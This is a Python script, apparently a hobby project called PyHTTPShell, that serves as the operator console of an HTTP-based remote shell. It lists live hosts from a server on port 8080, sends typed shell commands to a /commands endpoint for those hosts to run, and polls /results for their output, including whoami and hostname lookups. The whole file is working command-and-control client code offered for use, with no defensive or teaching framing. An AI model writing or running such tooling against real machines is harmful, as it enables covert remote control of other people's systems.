#!/usr/bin/env python3

import requests
import time
import socket
import os
import json
from termcolor import colored

SERVER_IP = socket.gethostbyname(socket.gethostname())

class ShellClient:
    def __init__(self):
        self.current_path = "~/"
        self.user = None
        self.hostname = None
        self.prompt = None
    

    # SORRY FOR THE STATIC METHODS LOL
    @staticmethod
    def clear_screen():
        os.system("cls" if os.name == "nt" else "clear")
    
    # SORRY FOR THE STATIC METHODS LOL
    @staticmethod
    def main_menu():
        print("\n1. Start Shell")
        print("2. Exit")
        print("\n")

    # SORRY FOR THE STATIC METHODS LOL
    @staticmethod
    def banner():
        print("\n" + "-"*30)
        print("{:^30}".format("PyHTTPShell"))
        print("-"*30 + "\n")

    # SORRY FOR THE STATIC METHODS LOL
    @staticmethod
    def get_alive():
        alive_hosts = requests.get(f"http://{SERVER_IP}:8080/alive_hosts").text
        if alive_hosts:
            alive_hosts = json.loads(alive_hosts)
            print(f"{colored(f'ALIVE HOSTS ({len(alive_hosts)})', 'green', attrs=['bold'])}")
            for host in alive_hosts:
                print(f"- {host}")
        else:
            print(f"{colored('NO HOSTS FOUND', 'red', attrs=['bold'])}\n")

    # SORRY FOR THE STATIC METHODS LOL
    @staticmethod
    def is_alive():
        return requests.get(f"http://{SERVER_IP}:8080/alive_hosts").text
    
    # SORRY FOR THE STATIC METHODS LOL
    @staticmethod
    def fake_attempt():
        print(colored("[*] Attempting Connection...", 'white', attrs=['bold']))


    def update_prompt(self):
        self.prompt = f"{colored(f'{self.user}@', 'green')}{colored(self.hostname, 'green')}{colored(f':{self.current_path}$ ', 'white')}"
    
    def send_command(self, cmd: str):
        full_cmd = f"cd {self.current_path} && {cmd}" if self.current_path else cmd
        requests.post(f"http://{SERVER_IP}:8080/commands", data=full_cmd)

    def handle_cd_command(self, cmd: str):
        if cmd == "cd ~" or cmd == "cd": # return to home directory
            self.current_path = None
        elif cmd == "cd ..":
            self.current_path = "/".join(self.current_path.split("/")[:-2]) + "/" # remove last directory
        else:
            path = cmd.split(" ")[1]
            self.current_path += f"{path}/"

    def get_result(self):
        res = requests.get(f"http://{SERVER_IP}:8080/results").text
        while not res:
            time.sleep(1)
            res = requests.get(f"http://{SERVER_IP}:8080/results").text
        return res
    
    def set_hostname(self):
        self.send_command("hostname")
        self.hostname = self.get_result().strip()
    
    def set_user(self):
        self.send_command("whoami")
        self.user = self.get_result().strip()


    def welcome_banner(self):
        print(
            f"{colored('IMPORTANT: ', 'red', attrs=['bold'])}This is not a real shell, and it is relatively unstable.\
        A list of custom commands is available by using the command {colored('`$help`', 'white', attrs=['bold'])}.\n\
            \n[*] Welcome {colored(self.user + '@' + self.hostname, 'green')}\
            \n[*] Type 'exit' to quit\n"
        )

    
    def beautify_shell(self):
        self.clear_screen()
        self.fake_attempt()
        self.set_hostname()
        self.set_user()
        self.welcome_banner()

    def shell(self):
        self.beautify_shell()
        while True:
            self.update_prompt()
            cmd = input(self.prompt)
            if cmd == "exit":
                break
            if "cd" in cmd:
                self.handle_cd_command(cmd)
                continue
            self.send_command(cmd)
            result = self.get_result()
            print(colored(result, 'white'))
    def run(self):
        while True:
            self.banner()
            self.get_alive()
            self.main_menu()
            choice = input(">> ")
            if choice == "1":
                self.shell()
            elif choice == "2":
                break

if __name__ == "__main__":
    client = ShellClient()
    client.run()

print("a")